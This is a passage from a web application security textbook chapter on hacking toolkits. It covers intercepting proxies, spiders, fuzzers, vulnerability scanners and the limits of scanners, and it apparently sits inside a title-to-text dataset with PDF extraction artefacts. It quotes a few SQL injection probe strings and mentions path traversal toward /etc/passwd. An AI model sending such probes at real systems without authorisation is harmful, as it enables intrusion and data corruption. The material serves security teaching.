for\nreview or silently forwarded, based on criteria such as the target host,\nURL, method, resource type, response code, or appearance of specifi c\nexpressions (see Figure 20-5). In a typical application, the vast majority of\nrequests and responses are of little interest to you. This function allows you\nto confi gure the proxy to fl ag only the messages that you are interested in.\nn A detailed history of all requests and responses, allowing previous messages\nto be reviewed and passed to other tools in the suite for further analysis\n(see Figure 20-6). You can fi lter and search the proxy history to quickly fi nd\nspecifi c items, and you can annotate interesting items for future reference.\nn Automated match-and-replace rules for dynamically modifying the con-\ntents of requests and responses. This function can be useful in numerous\nsituations. Examples include rewriting the value of a cookie or other\nparameter in all requests, removing cache directives, and simulating a\nspecifi c browser with the User-Agent header.\nn Access to proxy functionality directly from within the browser, in addition\nto the client UI. You can browse the proxy history and reissue individual\nrequests from the context of your browser, enabling the responses to be\nfully processed and interpreted in the normal way.\nn Utilities for manipulating the format of HTTP messages, such as convert-\ning between different request methods and content encodings. These can\nsometimes be useful when fi ne-tuning an attack such as cross-site scripting.\ncc2200..iinndddd 775588 88//1199//22001111 1122::2211::0066 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 759\nChapter 20 n A Web Application Hacker’s Toolkit 759\nn Functions to automatically modify certain HTML features on-the-fl y. You\ncan unhide hidden form fi elds, remove input fi eld limits, and remove\nJavaScript form validation.\nFigure 20-5: Burp proxy supports configuration of fine-grained rules for intercepting\nrequests and responses\nFigure 20-6: The proxy history, allowing you to view, filter, search, and annotate\nrequests and responses made via the proxy\ncc2200..iinndddd 775599 88//1199//22001111 1122::2211::0066 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 760\n760 Chapter 20 n A Web Application Hacker’s Toolkit\nWeb Application Spiders\nWeb application spiders work much like traditional web spiders. They request\nweb pages, parse them for links to other pages, and then request those pages,\ncontinuing recursively until all of a site’s content has been discovered. To accom-\nmodate the differences between functional web applications and traditional\nwebsites, application spiders must go beyond this core function and address\nvarious other challenges:\nn Forms-based navigation, using drop-down lists, text input, and other\nmethods\nn JavaScript-based navigation, such as dynamically generated menus\nn Multistage functions requiring actions to be performed in a defi ned sequence\nn Authentication and sessions\nn The use of parameter-based identifi ers, rather than the URL, to specify\ndifferent content and functionality\nn The appearance of tokens and other volatile parameters within the URL\nquery string, leading to problems identifying unique content\nSeveral of these problems are addressed in integrated testing suites by shar-\ning data between the intercepting proxy and spider components. This enables\nyou to use the target application in the normal way, with all requests being pro-\ncessed by the proxy and passed to the spider for further analysis. Any unusual\nmechanisms for navigation, authentication, and session handling are thereby\ntaken care of by your browser and your actions. This enables the spider to build\na detailed picture of the application’s contents under your fi ne-grained control.\nThis user-directed spidering technique is described in detail in Chapter 4.\nHaving assembled as much information as possible, the spider can then be\nlaunched to investigate further under its own steam, potentially discovering\nadditional content and functionality.\nThe following features are commonly implemented within web application\nspiders:\nn Automatic update of the site map with URLs accessed via the intercept-\ning proxy.\nn Passive spidering of content processed by the proxy, by parsing it for\nlinks and adding these to the site map without actually requesting them\n(see Figure 20-7).\nn Presentation of discovered content in table and tree form, with the facility\nto search these results.\nn Fine-grained control over the scope of automated spidering. This enables\nyou to specify which hostnames, IP addresses, directory paths, fi le types,\ncc2200..iinndddd 776600 88//1199//22001111 1122::2211::0066 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 761\nChapter 20 n A Web Application Hacker’s Toolkit 761\nand other items the spider should request to focus on a particular area of\nfunctionality. You should prevent the spider from following inappropriate\nlinks either within or outside of the target application’s infrastructure. This\nfeature is also essential to avoid spidering powerful functionality such as\nadministrative interfaces, which may cause dangerous side effects such\nas the deletion of user accounts. It is also useful to prevent the spider\nfrom requesting the logout function, thereby invalidating its own session.\nn Automatic parsing of HTML forms, scripts, comments, and images, and\nanalysis of these within the site map.\nn Parsing of JavaScript content for URLs and resource names. Even if a full\nJavaScript engine is not implemented, this function often enables a spider\nto discover the targets of JavaScript-based navigation, because these usu-\nally appear in literal form within the script.\nn Automatic and user-guided submission of forms with suitable parameters\n(see Figure 20-8).\nn Detection of customized File Not Found responses. Many applications\nrespond with an HTTP 200 message when an invalid resource is requested.\nIf spiders are unable to recognize this, the resulting content map will\ncontain false positives.\nn Checking for the robots.txt fi le, which is intended to provide a blacklist\nof URLs that should not be spidered, but that an attacking spider can use\nto discover additional content.\nn Automatic retrieval of the root of all enumerated directories. This can\nbe useful to check for directory listings or default content (see\nChapter 17).\nn Automatic processing and use of cookies issued by the application to\nenable spidering to be performed in the context of an authenticated session.\nn Automatic testing of session dependence of individual pages. This involves\nrequesting each page both with and without any cookies that have been\nreceived. If the same content is retrieved, the page does not require a ses-\nsion or authentication. This can be useful when probing for some kinds\nof access control fl aws (see Chapter 8).\nn Automatic use of the correct Referer header when issuing requests. Some\napplications may check the contents of this header, and this function ensures\nthat the spider behaves as much as possible like an ordinary browser.\nn Control of other HTTP headers used in automated spidering.\nn Control over the speed and order of automated spider requests to\navoid overwhelming the target and, if necessary, behave in a stealthy\nmanner.\ncc2200..iinndddd 776611 88//1199//22001111 1122::2211::0077 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 762\n762 Chapter 20 n A Web Application Hacker’s Toolkit\nFigure 20-7: The results of passive application spidering, where items in gray have\nbeen identified passively but not yet requested\nFigure 20-8: Burp Spider prompting for user guidance when\nsubmitting forms\nWeb Application Fuzzers\nAlthough it is possible to perform a successful attack using only manual tech-\nniques, to become a truly accomplished web application hacker, you need to\nautomate your attacks to enhance their speed and effectiveness. Chapter 14\ncc2200..iinndddd 776622 88//1199//22001111 1122::2211::0077 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 763\nChapter 20 n A Web Application Hacker’s Toolkit 763\ndescribed in detail the different ways in which automation can be used in cus-\ntomized attacks. Most test suites include functions that leverage automation to\nfacilitate various common tasks. Here are some commonly implemented features:\nn Manually confi gured probing for common vulnerabilities. This function\nenables you to control precisely which attack strings are used and how they\nare incorporated into requests. Then you can review the results to identify\nany unusual or anomalous responses that merit further investigation.\nn A set of built-in attack payloads and versatile functions to generate arbi-\ntrary payloads in user-defi ned ways — for example, based on malformed\nencoding, character substitution, brute force, and data retrieved in a\nprevious attack.\nn The ability to save attack results and response data to use in reports or\nincorporate into further attacks.\nn Customizable functions for viewing and analyzing responses — for exam-\nple, based on the appearance of specifi c expressions or the attack payload\nitself (see Figure 20-9).\nn Functions for extracting useful data from the application’s responses — for\nexample, by parsing the username and password fi elds in a My Details\npage. This can be useful when you are exploiting various vulnerabilities,\nincluding fl aws in session-handling and access controls.\nFigure 20-9: The results of a fuzzing exercise using Burp Intruder\ncc2200..iinndddd 776633 88//1199//22001111 1122::2211::0077 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 764\n764 Chapter 20 n A Web Application Hacker’s Toolkit\nWeb Vulnerability Scanners\nSome integrated testing suites include functions to scan for common web appli-\ncation vulnerabilities. The scanning that is performed falls into two categories:\nn Passivescanning involves monitoring the requests and responses passing\nthrough the local proxy to identify vulnerabilities such as cleartext password\nsubmission, cookie misconfi guration, and cross-domain Referer leakage.\nYou can perform this type of scanning noninvasively with any applica-\ntion that you visit with your browser. This feature is often useful when\nscoping out a penetration testing engagement. It gives you a feel for the\napplication’s security posture in relation to these kinds of vulnerabilities.\nn Activescanning involves sending new requests to the target application\nto probe for vulnerabilities such as cross-site scripting, HTTP header\ninjection, and fi le path traversal. Like any other active testing, this type\nof scanning is potentially dangerous and should be carried out only with\nthe consent of the application owner.\nThe vulnerability scanners included within testing suites are more user-\ndriven than the standalone scanners discussed later in this chapter. Instead of\njust providing a start URL and leaving the scanner to crawl and test the applica-\ntion, the user can guide the scanner around the application, control precisely\nwhich requests are scanned, and receive real-time feedback about individual\nrequests. Here are some typical ways to use the scanning function within an\nintegrated testing suite:\nn After manually mapping an application’s contents, you can select interest-\ning areas of functionality within the site map and send these to be scanned.\nThis lets you target your available time into scanning the most critical\nareas and receive the results from these areas more quickly.\nn When manually testing individual requests, you can supplement your\nefforts by scanning each specifi c request as you are testing it. This gives\nyou nearly instant feedback about common vulnerabilities for that request,\nwhich can guide and optimize your manual testing.\nn You can use the automated spidering tool to crawl the entire application\nand then scan all the discovered content. This emulates the basic behavior\nof a standalone web scanner.\nn In Burp Suite, you can enable live scanning as you browse. This lets you\nguide the scanner’s coverage using your browser and receive quick feed-\nback about each request you make, without needing to manually identify\nthe requests you want to scan. Figure 20-10 shows the results of a live\nscanning exercise.\ncc2200..iinndddd 776644 88//1199//22001111 1122::2211::0077 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 765\nChapter 20 n A Web Application Hacker’s Toolkit 765\nFigure 20-10: The results of live scanning as you browse with Burp Scanner\nAlthough the scanners in integrated testing suites are designed to be used in a\ndifferent way than standalone scanners, in some cases the core scanning engine\nis highly capable and compares favorably with those of the leading standalone\nscanners, as described later in this chapter.\nManual Request Tools\nThe manual request component of the integrated testing suites provides the basic\nfacility to issue a single request and view its response. Although simple, this\nfunction is often benefi cial when you are probing a tentative vulnerability and\nneed to reissue the same request manually several times, tweaking elements of\nthe request to determine the effect on the application’s behavior. Of course, you\ncould perform this task using a standalone tool such as Netcat, but having the\ncc2200..iinndddd 776655 88//1199//22001111 1122::2211::0077 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 766\n766 Chapter 20 n A Web Application Hacker’s Toolkit\nfunction built in to the suite means that you can quickly retrieve an interesting\nrequest from another component (proxy, spider, or fuzzer) for manual investiga-\ntion. It also means that the manual request tool benefi ts from the various shared\nfunctions implemented within the suite, such as HTML rendering, support for\nupstream proxies and authentication, and automatic updating of the Content-\nLength header. Figure 20-11 shows a request being reissued manually.\nFigure 20-11: A request being reissued manually using Burp Repeater\nThe following features are often implemented within manual request tools:\nn Integration with other suite components, and the ability to refer any request\nto and from other components for further investigation\nn A history of all requests and responses, keeping a full record of all manual\nrequests for further review, and enabling a previously modifi ed request\nto be retrieved for further analysis\ncc2200..iinndddd 776666 88//1199//22001111 1122::2211::0088 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 767\nChapter 20 n A Web Application Hacker’s Toolkit 767\nn A multitabbed interface, letting you work on several different items at once\nn The ability to automatically follow redirections\nSession Token Analyzers\nSome testing suites include functions to analyze the randomness proper-\nties of session cookies and other tokens used within the application where\nthere is a need for unpredictability. Burp Sequencer is a powerful tool that\nperforms standard statistical tests for randomness on an arbitrarily sized\nsample of tokens and provides fi ne-grained results in an accessible format.\nBurp Sequencer is shown in Figure 20-12 and is described in more detail in\nChapter 7.\nFigure 20-12: Using Burp Sequencer to test the randomness properties of an\napplication’s session token\ncc2200..iinndddd 776677 88//1199//22001111 1122::2211::0088 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 768\n768 Chapter 20 n A Web Application Hacker’s Toolkit\nShared Functions and Utilities\nIn addition to their core tool components, integrated test suites provide a wealth\nof other value-added features that address specifi c needs that arise when you are\nattacking a web application and that enable the other tools to work in unusual\nsituations. The following features are implemented by the different suites:\nn Analysis of HTTP message structure, including parsing of headers and\nrequest parameters, and unpacking of common serialization formats (see\nFigure 20-13)\nn Rendering of HTML content in responses as it would appear within the\nbrowser\nn The ability to display and edit messages in text and hexadecimal form\nn Search functions within all requests and responses\nn Automatic updating of the HTTP Content-Length header following any\nmanual editing of message contents\nn Built-in encoders and decoders for various schemes, enabling quick analysis\nof application data in cookies and other parameters\nn A function to compare two responses and highlight the differences\nn Features for automated content discovery and attack surface analysis\nn The ability to save to disk the current testing session and retrieve saved\nsessions\nn Support for upstream web proxies and SOCKS proxies, enabling you to\nchain together different tools or access an application via the proxy server\nused by your organization or ISP\nn Features to handle application sessions, login, and request tokens, allow-\ning you to continue using manual and automated techniques when faced\nwith unusual or highly defensive session-handling mechanisms\nn In-tool support for HTTP authentication methods, enabling you to use\nall the suite’s features in environments where these are used, such as\ncorporate LANs\nn Support for client SSL certifi cates, enabling you to attack applications\nthat employ these\nn Handling of the more obscure features of HTTP, such as gzip content\nencoding, chunked transfer encoding, and status 100 interim responses\nn Extensibility, enabling the built-in functionality to be modifi ed and extended\nin arbitrary ways by third-party code\nn The ability to schedule common tasks, such as spidering and scanning,\nallowing you to start the working day asleep\ncc2200..iinndddd 776688 88//1199//22001111 1122::2211::0088 PPMM"
  },
  {
    "input": "Testing Work Flow",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 769\nChapter 20 n A Web Application Hacker’s Toolkit 769\nn Persistent confi guration of tool options, enabling a particular setup to be\nresumed on the next execution of the suite\nn Platform independence, enabling the tools to run on all popular operat-\ning systems\nFigure 20-13: Requests and responses can be analyzed into their HTTP\nstructure and parameters\nTesting Work Flow\nFigure 20-14 shows a typical work fl ow for using an integrated testing suite.\nThe key steps involved in each element of the testing are described in detail\nthroughout this book and are collated in the methodology set out in Chapter 21.\nThe work fl ow described here shows how the different components of the test-\ning suite fi t into that methodology.\nIn this work fl ow, you drive the overall testing process using your browser.\nAs you browse the application via the intercepting proxy, the suite compiles\ntwo key repositories of information:\nn The proxy history records every request and response passing through\nthe proxy.\nn The sitemap records all discovered items in a directory tree view of the\ntarget.\n(Note that in both cases, the default display fi lters may hide from view some\nitems that are not normally of interest when testing.)\nAs described in Chapter 4, as you browse the application, the testing suite\ntypically performs passive spidering of discovered content. This updates the site\nmap with all requests passing through the proxy. It also adds items that have\ncc2200..iinndddd 776699 88//1199//22001111 1122::2211::0088 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 770\n770 Chapter 20 n A Web Application Hacker’s Toolkit\nbeen identifi ed based on the contents of responses passing through the proxy\n(by parsing links, forms, scripts, and so on). After you have manually mapped\nthe application’s visible content using your browser, you may additionally use\nthe Spider and Content Discovery functions to actively probe the application for\nadditional content. The outputs from these tools are also added to the site map.\nRecon and analysis\nWeb\nbrowser\nIntercepting\nproxy\npassive\nspidering active\nSpider\nspidering\nProxy history Site map\nactive Content\ndiscovery discovery\nattack surface\npassive Vulnerability detection\nscanning and exploitation\nconfirm some\nvulnerabilities\nin browser\nToken\nScanner Repeater Fuzzer\nanalyzer\nVulnerabilities\nFigure 20-14: A typical work flow for using an integrated testing suite\nWhen you have mapped the application’s content and functionality, you can\nassess its attack surface. This is the set of functionality and requests that war-\nrants closer inspection in an attempt to fi nd and exploit vulnerabilities.\nWhen testing for vulnerabilities, you typically select items from the proxy\ninterception window, proxy history, or site map, and send these to other tools\nwithin the suite to perform specifi c tasks. As we have described, you can use the\nfuzzing tool to probe for input-based vulnerabilities and deliver other attacks\nsuch as harvesting sensitive information. You can use the vulnerability scan-\nner to automatically check for common vulnerabilities, using both passive and\ncc2200..iinndddd 777700 88//1199//22001111 1122::2211::0099 PPMM"
  },
  {
    "input": "Alternatives to the Intercepting Proxy",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 771\nChapter 20 n A Web Application Hacker’s Toolkit 771\nactive techniques. You can use the token analyzer tool to test the randomness\nproperties of session cookies and other tokens. And you can use the request\nrepeater to modify and reissue an individual request repeatedly to probe for\nvulnerabilities or exploit bugs you have already discovered. Often you will pass\nindividual items back and forth between these different tools. For example,\nyou may select an interesting item from a fuzzing attack, or an issue reported\nby the vulnerability scanner, and pass this to the request repeater to verify the\nvulnerability or refi ne an exploit.\nFor many types of vulnerabilities, you will typically need to go back to your\nbrowser to investigate an issue further, confi rm whether an apparent vulnerabil-\nity is genuine, or test a working exploit. For example, having found a cross-site\nscripting fl aw using the vulnerability scanner or request repeater, you may paste\nthe resulting URL back into your browser to confi rm that your proof-of-concept\nexploit is executed. When testing possible access control bugs, you may view\nthe results of particular requests in your current browser session to confi rm the\nresults within a specifi c user context. If you discover a SQL injection fl aw that\ncan be used to extract large amounts of information, you might revert to your\nbrowser as the most useful location to display the results.\nYou should not regard the work fl ow described here as in any way rigid or\nrestrictive. In many situations, you may test for bugs by entering unexpected\ninput directly into your browser or into the proxy interception window. Some\nbugs may be immediately evident in requests and responses without the need to\ninvolve any more attack-focused tools. You may bring in other tools for particular\npurposes. You also may combine the components of the testing suite in innova-\ntive ways that are not described here and maybe were not even envisioned by\nthe tool’s author. Integrated testing suites are hugely powerful creations, with\nnumerous interrelated features. The more creative you can be when using them,\nthe more likely you are to discover the most obscure vulnerabilities!\nAlternatives to the Intercepting Proxy\nOne item that you should always have available in your toolkit is an alternative\nto the usual proxy-based tools for the rare situations in which they cannot be\nused. Such situations typically arise when you need to use some nonstandard\nauthentication method to access the application, either directly or via a corporate\nproxy, or where the application uses an unusual client SSL certifi cate or browser\nextension. In these cases, because an intercepting proxy interrupts the HTTP\nconnection between client and server, you may fi nd that the tool prevents you\nfrom using some or all of the application’s functionality.\nThe standard alternative approach in these situations is to use an in-browser\ntool to monitor and manipulate the HTTP requests generated by your browser.\nIt remains the case that everything that occurs on the client, and all data sub-\nmitted to the server, is in principle under your full control. If you so desired,\nyou could write your own fully customized browser to perform any task you\ncc2200..iinndddd 777711 88//1199//22001111 1122::2211::0099 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 772\n772 Chapter 20 n A Web Application Hacker’s Toolkit\nrequired. What these browser extensions do is provide a quick and easy way to\ninstrument the functionality of a standard browser without interfering with the\nnetwork-layer communications between the browser and server. This approach\ntherefore enables you to submit arbitrary requests to the application while\nallowing the browser to use its normal means of communicating with the\nproblematic application.\nNumerous extensions are available for both Internet Explorer and Firefox\nthat implement broadly similar functionality. We will illustrate one example\nof each. We recommend that you experiment with various options to fi nd the\none that best suits you.\nYou should note that the functionality of the existing browser extensions is\nvery limited in comparison to the main tool suites. They do not perform any\nspidering, fuzzing, or vulnerability scanning, and you are restricted to working\ncompletely manually. Nevertheless, in situations where you are forced to use\nthem, they will enable you to perform a comprehensive attack on your target\nthat would not be possible using only a standard browser.\nTamper Data\nTamper Data, shown in Figure 20-15, is an extension to the Firefox browser.\nAnytime you submit a form, Tamper Data displays a pop-up showing all the\nrequest details, including HTTP headers and parameters, which you can view\nand modify.\nFigure 20-15: Tamper Data lets you modify HTTP request details within Firefox\nTamperIE\nTamperIE, shown in Figure 20-16, implements essentially the same functionality\nwithin the Internet Explorer browser as Tamper Data does on Firefox.\ncc2200..iinndddd 777722 88//1199//22001111 1122::2211::0099 PPMM"
  },
  {
    "input": "Standalone Vulnerability Scanners",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 773\nChapter 20 n A Web Application Hacker’s Toolkit 773\nFigure 20-16: TamperIE lets you modify HTTP request details\nwithin Internet Explorer\nStandalone Vulnerability Scanners\nA number of different tools exist for performing completely automated vulner-\nability scans of web applications. These scanners have the benefi t of being able\nto test a large amount of functionality in a relatively short time. In a typical\napplication they often can identify a variety of important vulnerabilities.\nStandalone web application vulnerability scanners automate several of the\ntechniques we have described in this book, including application spidering,\ndiscovery of default and common content, and probing for common vulner-\nabilities. Having mapped the application’s content, the scanner works through\nits functionality, submitting a range of test strings within each parameter\nof each request, and analyzes the application’s responses for signatures of\ncommon vulnerabilities. The scanner produces a report describing each of\nthe vulnerabilities it has discovered. This report usually includes the specifi c\nrequest and response that the application used to diagnose each reported\nvulnerability, enabling a knowledgeable user to manually investigate and\nconfi rm the bug’s existence.\nA key requirement when you are deciding whether and when to use a\nvulnerability scanner is to understand the inherent strengths and weak-\nnesses of these types of tools and the challenges that need to be addressed\nin the course of developing them. These considerations also affect how you\ncan effectively make use of an automated scanner and how to interpret and\nrely on its results.\ncc2200..iinndddd 777733 88//1199//22001111 1122::2211::0099 PPMM"
  },
  {
    "input": "Vulnerabilities Detected by Scanners",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 774\n774 Chapter 20 n A Web Application Hacker’s Toolkit\nVulnerabilities Detected by Scanners\nSeveral categories of common vulnerabilities can be detected by scanners with\na degree of reliability. These are vulnerabilities with a fairly standard signature.\nIn some cases, the signature exists within the application’s normal requests and\nresponses. In other cases, the scanner sends a crafted request designed to trig-\nger the signature if the vulnerability is present. If the signature appears in the\napplication’s response to the request, the scanner infers that the vulnerability\nis present.\nHere are some examples of vulnerabilities that can be detected in this way:\nn Refl ected cross-site scripting vulnerabilities arise when user-supplied input\nis echoed in the application’s responses without appropriate sanitization.\nAutomated scanners typically send test strings containing HTML markup\nand search the responses for these strings, enabling them to detect many\nof these fl aws.\nn Some SQL injection vulnerabilities can be detected via a signature. For\nexample, submitting a single quotation mark may result in an ODBC error\nmessage, or submitting the string ‘; waitfor delay ‘0:0:30’-- may\nresult in a time delay.\nn Some path traversal vulnerabilities can be detected by submitting a tra-\nversal sequence targeting a known fi le such as win.ini or /etc/passwd\nand searching the response for the appearance of this fi le.\nn Some command injection vulnerabilities can be detected by injecting a\ncommand that causes a time delay or echoes a specifi c string into the\napplication’s response.\nn Straightforward directory listings can be identifi ed by requesting the\ndirectory path and looking for a response containing text that looks like\na directory listing.\nn Vulnerabilities such as cleartext password submission, liberally scoped\ncookies, and forms with autocomplete enabled can be reliably detected\nby reviewing the normal requests and responses the application makes.\nn Items not linked from the main published content, such as backup fi les\nand source fi les, can often be discovered by requesting each enumerated\nresource with a different fi le extension.\nIn many of these cases, some instances of the same category of vulnerability\ncannot be reliably detected using a standard attack string and signature. For\nexample, with many input-based vulnerabilities, the application implements some\nrudimentary input validation that can be circumvented using crafted input. The\nusual attack strings may be blocked or sanitized; however, a skilled attacker can\nprobe the input validation in place and discover a bypass to it. In other cases,\ncc2200..iinndddd 777744 88//1199//22001111 1122::2211::0099 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 775\nChapter 20 n A Web Application Hacker’s Toolkit 775\na vulnerability may be triggered by standard strings but may not result in the\nexpected signature. For example, many SQL injection attacks do not result in any\ndata or error messages being returned to the user, and a path traversal vulner-\nability may not result in the contents of the targeted fi le being directly returned\nin the application’s response. In some of these cases, a sophisticated scanner may\nstill be able to identify the vulnerability, or at least note some anomalous behavior\nfor manual investigation, but this is not feasible in all cases.\nFurthermore, several important categories of vulnerabilities do not have a stan-\ndard signature and cannot be probed for using a standard set of attack strings.\nIn general, automated scanners are ineffective at discovering defects of this kind.\nHere are some examples of vulnerabilities that scanners cannot reliably detect:\nn Broken access controls, which enable a user to access other users’ data,\nor a low-privileged user to access administrative functionality. A scan-\nner does not understand the access control requirements relevant to the\napplication, nor can it assess the signifi cance of the different functions\nand data it discovers using a particular user account.\nn Attacks that involve modifying a parameter’s value in a way that has\nmeaning within the application — for example, a hidden fi eld representing\nthe price of a purchased item or the status of an order. A scanner does not\nunderstand the meaning that any parameter has within the application’s\nfunctionality.\nn Other logic fl aws, such as beating a transaction limit using a negative\nvalue, or bypassing a stage of an account recovery process by omitting a\nkey request parameter.\nn Vulnerabilities in the design of application functionality, such as weak\npassword quality rules, the ability to enumerate usernames from login\nfailure messages, and easily guessable forgotten-password hints.\nn Session hijacking attacks in which a sequence can be detected in the appli-\ncation’s session tokens, enabling an attacker to masquerade as other users.\nEven if a scanner can recognize that a particular parameter has a predict-\nable value across successive logins, it will not understand the signifi cance\nof the different content that results from modifying that parameter.\nn Leakage of sensitive information such as listings of usernames and logs\ncontaining session tokens.\nSome vulnerability scanners attempt to check for some of these vulnerabilities.\nFor example, some scanners attempt to locate access control bugs by logging\ninto an application in two different user contexts and trying to identify data\nand functions that one user can access without proper authorization. In the\nauthors’ experience, checks such as these typically generate a huge number of\nfalse positive and false negative results.\ncc2200..iinndddd 777755 88//1199//22001111 1122::2211::1100 PPMM"
  },
  {
    "input": "Inherent Limitations of Scanners",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 776\n776 Chapter 20 n A Web Application Hacker’s Toolkit\nWithin the previous two listings of vulnerabilities, each list contains defects\nthat may be classifi ed as low-hanging fruit — those that can be easily detected\nand exploited by an attacker with modest skills. Hence, although an automated\nscanner will often detect a decent proportion of the low-hanging fruit within\nan application, it will also typically miss a signifi cant number of these prob-\nlems — including some low-hanging fruit that any manual attack would detect!\nGetting a clean bill of health from an automated scanner never provides any\nsolid assurance that the application does not contain some serious vulnerabilities\nthat can be easily found and exploited.\nIt is also fair to say that in the more security-critical applications that cur-\nrently exist, which have been subjected to more stringent security requirements\nand testing, the vulnerabilities that remain tend to be those appearing on the\nsecond list, rather than the fi rst.\nInherent Limitations of Scanners\nThe best vulnerability scanners on the market were designed and implemented\nby experts who have given serious thought to the possible ways in which all\nkinds of web application vulnerabilities can be detected. It is no accident that\nthe resulting scanners remain unable to reliably detect many categories of vul-\nnerabilities. A fully automated approach to web application testing presents\nvarious inherent barriers. These barriers can be effectively addressed only by\nsystems with full-blown artifi cial intelligence engines, going far beyond the\ncapabilities of today’s scanners.\nEvery Web Application Is Different\nWeb applications differ starkly from the domain of networks and infrastruc-\ntures, in which a typical installation employs off-the-shelf products in more\nor less standard confi gurations. In the case of network infrastructure, it is\npossible in principle to construct in advance a database of all possible targets\nand create a tool to probe for every associated defect. This is not possible\nwith customized web applications, so any effective scanner must expect the\nunexpected.\nScanners Operate on Syntax\nComputers can easily analyze the syntactic content of application responses\nand can recognize common error messages, HTTP status codes, and user-\nsupplied data being copied into web pages. However, today’s scanners cannot\nunderstand the semantic meaning of this content, nor can they make norma-\ntive judgments on the basis of this meaning. For example, in a function that\nupdates a shopping cart, a scanner simply sees numerous parameters being\ncc2200..iinndddd 777766 88//1199//22001111 1122::2211::1100 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 777\nChapter 20 n A Web Application Hacker’s Toolkit 777\nsubmitted. It doesn’t know that one of these parameters signifi es a quantity\nand another signifi es a price. Furthermore, it doesn’t know that being able to\nmodify an order’s quantity is inconsequential, whereas being able to modify\nits price represents a security fl aw.\nScanners Do Not Improvise\nMany web applications use nonstandard mechanisms to handle sessions and\nnavigation and to transmit and handle data, such as in the structure of the\nquery string, cookies, or other parameters. A human being may quickly notice\nand deconstruct the unusual mechanism, but a computer will continue follow-\ning the standard rules it has been given. Furthermore, many attacks against\nweb applications require some improvisation, such as to circumvent partially\neffective input fi lters or to exploit several different aspects of the application’s\nbehavior that collectively leave it open to attack. Scanners typically miss these\nkinds of attacks.\nScanners Are Not Intuitive\nComputers do not have intuition about how best to proceed. The approach of\ntoday’s scanners is largely to attempt every attack against every function. This\nimposes a practical limit on the variety of checks that can be performed and the\nways in which these can be combined. This approach overlooks vulnerabilities\nin many cases:\nn Some attacks involve submitting crafted input at one or more steps of a\nmultistage process and walking through the rest of the process to observe\nthe results.\nn Some attacks involve changing the sequence of steps in which the applica-\ntion expects a process to be performed.\nn Some attacks involve changing the value of multiple parameters in crafted\nways. For example, an XSS attack may require a specifi c value to be placed\ninto one parameter to cause an error message, and an XSS payload to be\nplaced into another parameter, which is copied into the error message.\nBecause of the practical constraints imposed on scanners’ brute-force approach\nto vulnerability detection, they cannot work through every permutation of\nattack string in different parameters, or every permutation of functional steps.\nOf course, no human being can do this practically either. However, a human\nfrequently has a feel for where the bugs are located, where the developer made\nassumptions, and where something doesn’t “look right.” Hence, a human tester\nwill select a tiny proportion of the total possible attacks for actual investigation\nand thereby will often achieve success.\ncc2200..iinndddd 777777 88//1199//22001111 1122::2211::1100 PPMM"
  },
  {
    "input": "Technical Challenges Faced by Scanners",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 778\n778 Chapter 20 n A Web Application Hacker’s Toolkit\nTechnical Challenges Faced by Scanners\nThe barriers to automation described previously lead to a number of specifi c\ntechnical challenges that must be addressed in the creation of an effective\nvulnerability scanner. These challenges affect not only the scanner’s ability to\ndetect specifi c types of vulnerabilities, as already described, but also its ability\nto perform the core tasks of mapping the application’s content and probing for\ndefects.\nSome of these challenges are not insuperable, and today’s scanners have found\nways of partially addressing them. Scanning is by no means a perfect science,\nhowever, and the effectiveness of modern scanning techniques varies widely\nfrom application to application.\nAuthentication and Session Handling\nThe scanner must be able to work with the authentication and session-handling\nmechanisms used by different applications. Frequently, the majority of an appli-\ncation’s functionality can only be accessed using an authenticated session, and a\nscanner that fails to operate using such a session will miss many detectable fl aws.\nIn current scanners, the authentication part of this problem is addressed by\nallowing the user of the scanner to provide a login script or to walk through the\nauthentication process using a built-in browser, enabling the scanner to observe\nthe specifi c steps involved in obtaining an authenticated session.\nThe session-handling part of the challenge is less straightforward to address\nand comprises the following two problems:\nn The scanner must be able to interact with whatever session-handling\nmechanism the application uses. This may involve transmitting a session\ntoken in a cookie, in a hidden form fi eld, or within the URL query string.\nTokens may be static throughout the session or may change on a per-request\nbasis, or the application may employ a different custom mechanism.\nn The scanner must be able to detect when its session has ceased to be valid\nso that it can return to the authentication stage to acquire a new one. This\nmay occur for various reasons. Perhaps the scanner has requested the logout\nfunction, or the application has terminated the session because the scan-\nner has performed abnormal navigation or has submitted invalid input.\nThe scanner must detect this both during its initial mapping exercises\nand during its subsequent probing for vulnerabilities. Different applica-\ntions behave in very different ways when a session becomes invalid. For a\nscanner that only analyzes the syntactic content of application responses,\nthis may be a diffi cult challenge to meet in general, particularly if a non-\nstandard session-handling mechanism is used.\ncc2200..iinndddd 777788 88//1199//22001111 1122::2211::1100 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 779\nChapter 20 n A Web Application Hacker’s Toolkit 779\nIt is fair to say that some of today’s scanners do a reasonable job of working\nwith the majority of authentication and session-handling mechanisms that are\nin use. However, there remain numerous cases where scanners struggle. As\na result, they may fail to properly crawl or scan key parts of an application’s\nattack surface. Because of the fully automated way in which standalone scan-\nners operate, this failure normally is not apparent to the user.\nDangerous Effects\nIn many applications, running an unrestricted automated scan without any user\nguidance may be quite dangerous to the application and the data it contains.\nFor example, a scanner may discover an administration page that contains\nfunctions to reset user passwords, delete accounts, and so on. If the scanner\nblindly requests every function, this may result in access being denied to all\nusers of the application. Similarly, the scanner may discover a vulnerability\nthat can be exploited to seriously corrupt the data held within the application.\nFor example, in some SQL injection vulnerabilities, submitting standard SQL\nattack strings such as or 1=1-- causes unforeseen operations to be performed\non the application’s data. A human being who understands the purpose of a\nparticular function may proceed with caution for this 